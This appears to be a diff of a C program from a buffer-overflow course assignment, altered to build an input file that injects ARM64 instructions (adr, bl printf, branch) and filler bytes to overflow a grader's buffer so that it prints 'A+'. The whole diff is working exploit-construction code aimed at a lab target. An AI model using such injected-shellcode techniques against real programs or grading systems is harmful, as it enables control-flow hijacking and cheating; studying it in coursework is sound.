@@ -7,11 +7,12 @@ int main(void) {
     unsigned int uiMov;
     unsigned int uiStrb;
     unsigned int uiB;
+    unsigned int uiBl;
     unsigned long ulAddress;
-    char* name = "Jacob";
+    char* name = "Josh";
     int i;
 
-    psFile = fopen("dataA", "w");
+    psFile = fopen("dataAplus", "w");
 
     for (i = 0; i < 5; i++) {
         char n = *name;
@@ -20,8 +21,7 @@ int main(void) {
         name++;
     }
 
-    putc('\0', psFile);
-    putc('\0', psFile);
+    fprintf(psFile, "A+");
     putc('\0', psFile);
 
     /* adr x0, grade */
@@ -36,20 +36,20 @@ int main(void) {
     uiStrb = MiniAssembler_strb(1, 0);
     fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
 
-    /* mov x0, 'Z' */
-    uiMov = MiniAssembler_mov(0, 'Z');
-    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
+    /* adr x0, "A+" */
+    uiAdr = MiniAssembler_adr(0, 0x42005d, 0x42006c);
+    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
 
     /* bl printf */
-    uiMov = MiniAssembler_bl(0x400600, );
-    fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
+    uiBl = MiniAssembler_bl(0x400600, 0x420070);
+    fwrite(&uiBl, sizeof(unsigned int), 1, psFile);
 
     /* b 0x400864 */
-    uiB = MiniAssembler_b(0x400864, 0x42006c);
+    uiB = MiniAssembler_b(0x400864, 0x420074);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
 
     /* filler to overflow buffer */
-    for (i = 0; i < 24; i++) {
+    for (i = 0; i < 16; i++) {
         fprintf(psFile, "%c", 'a');
     }
 
